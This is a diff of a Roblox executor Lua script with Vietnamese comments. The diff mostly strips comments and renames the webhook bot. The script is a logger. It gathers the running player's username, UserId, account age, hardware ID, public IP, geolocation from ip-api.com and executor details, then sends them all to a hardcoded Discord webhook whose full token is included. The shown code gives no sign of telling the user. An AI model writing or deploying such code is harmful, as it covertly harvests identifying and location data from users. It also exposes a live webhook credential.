@@ -10,10 +10,8 @@ local time = os.date("!%Y-%m-%d %H:%M:%S UTC")
 local placeId = game.PlaceId
 local gameLink = "https://www.roblox.com/games/" .. placeId
 
--- Webhook
 local webhookUrl = "https://discord.com/api/webhooks/1386309637824839781/DwrwUatQtTPoBJoSP1YLr0gZO5JU6QpupOktSD-zpRBo5uVVyS7e7PohrtuoinN_rwYD"
 
--- Lấy tên game
 local gameName = "Không xác định"
 pcall(function()
 	local info = MPS:GetProductInfo(placeId)
@@ -22,7 +20,6 @@ pcall(function()
 	end
 end)
 
--- Geo Info
 local geo = {}
 pcall(function()
 	local res = game:HttpGet("http://ip-api.com/json")
@@ -32,19 +29,17 @@ pcall(function()
 	end
 end)
 
--- Data gửi Discord
 local data = {
-	username = "Yui Asakura",
-	avatar_url = "https://raw.githubusercontent.com/Claireyter-Script/Cooking/main/1000023925.jpg",
+	username = "Maya",
+	avatar_url = "https://raw.githubusercontent.com/Claireyter-Script/Cooking/main/new_logo.png",
 	embeds = {{
-		title = "📩 Tệp lệnh đã được kích hoạt!",
+		title = "📩 Tệp lệnh đã được kích hoạt! Nowhywhats hãy xem!",
 		color = 0x007AFF,
 		fields = {},
 		footer = { text = "Webhook log" }
 	}}
 }
 
--- Hàm thêm field an toàn
 local function addField(name, value, inline)
 	if name and value and (typeof(value) == "string" or typeof(value) == "number") then
 		table.insert(data.embeds[1].fields, {
@@ -55,7 +50,6 @@ local function addField(name, value, inline)
 	end
 end
 
--- Người chơi
 if LP then
 	addField("👤 Người chơi", "**Username:** " .. LP.Name .. "\n**DisplayName:** " .. LP.DisplayName, true)
 	addField("🆔 ID", "**UserId:** " .. LP.UserId .. "\n**Tuổi tài khoản:** " .. LP.AccountAge .. " ngày", true)
@@ -63,15 +57,12 @@ end
 addField("🎮 Game", "[" .. gameName .. "](" .. gameLink .. ")", false)
 addField("🕓 Thời gian", time, false)
 
--- Executor
 pcall(function()
 	if identifyexecutor and typeof(identifyexecutor) == "function" then
 		local ex = identifyexecutor()
 		if ex then addField("💻 Executor", ex, true) end
 	end
 end)
-
--- HWID
 pcall(function()
 	if gethwid and typeof(gethwid) == "function" then
 		local hwid = gethwid()
@@ -79,7 +70,6 @@ pcall(function()
 	end
 end)
 
--- IP
 pcall(function()
 	local req = http_request or request or (syn and syn.request)
 	if req then
@@ -96,31 +86,26 @@ pcall(function()
 	end
 end)
 
--- Quốc gia
 if geo and geo.country and geo.regionName then
 	addField("🌎 Quốc gia", geo.country .. ", " .. geo.regionName, true)
 end
 
--- Thành viên 
 if LP and LP.MembershipType then
 	addField("💳 Thành viên", tostring(LP.MembershipType), true)
 end
 
--- Thiết bị và input
 if UIS then
 	addField("📱 Thiết bị", UIS.TouchEnabled and "Mobile" or "PC", true)
 	local input = UIS.KeyboardEnabled and "Keyboard" or UIS.GamepadEnabled and "Gamepad" or "Touch"
 	addField("⌨️ Đầu vào", input, true)
 end
 
--- Phiên bản Client
 pcall(function()
 	if typeof(version) == "function" then
 		addField("📦 Phiên bản client", version(), true)
 	end
 end)
 
--- FPS đo nhanh
 pcall(function()
 	local count = 0
 	local start = tick()
@@ -132,7 +117,6 @@ pcall(function()
 	addField("🎯 FPS", count, true)
 end)
 
--- RAM
 pcall(function()
 	if Stats then
 		local perf = Stats:FindFirstChild("PerformanceStats")
@@ -143,7 +127,6 @@ pcall(function()
 	end
 end)
 
--- FPS Cap
 pcall(function()
 	if getfpscap and typeof(getfpscap) == "function" then
 		local cap = getfpscap()
@@ -151,7 +134,6 @@ pcall(function()
 	end
 end)
 
--- Gửi Webhook
 local req = http_request or request or (syn and syn.request)
 if req then
 	pcall(function()
